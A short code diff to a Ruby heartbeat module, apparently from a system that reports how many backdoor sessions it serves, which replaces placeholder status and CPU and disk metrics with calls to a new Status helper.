@@ -4,6 +4,7 @@
 
 # relatives
 require_relative 'sessions.rb'
+require_relative 'status.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -34,14 +35,11 @@ class HeartBeat
     # if we are serving backdoors, report it accordingly
     message = (active_sessions > 0) ? "Serving #{active_sessions} sessions" : "Idle..."
 
-    # everything ok for us...
-    #TODO: set it accordingly
-    status = "OK"
-
-    #TODO: implement these metrics (ARGH!!)
-    disk = 0
-    cpu = 0
-    pcpu = 0
+    # report our status
+    status = Status.my_status
+    disk = Status.disk_free
+    cpu = Status.cpu_load
+    pcpu = Status.my_cpu_load
 
     # create the stats hash
     stats = {:disk => disk, :cpu => cpu, :pcpu => pcpu}
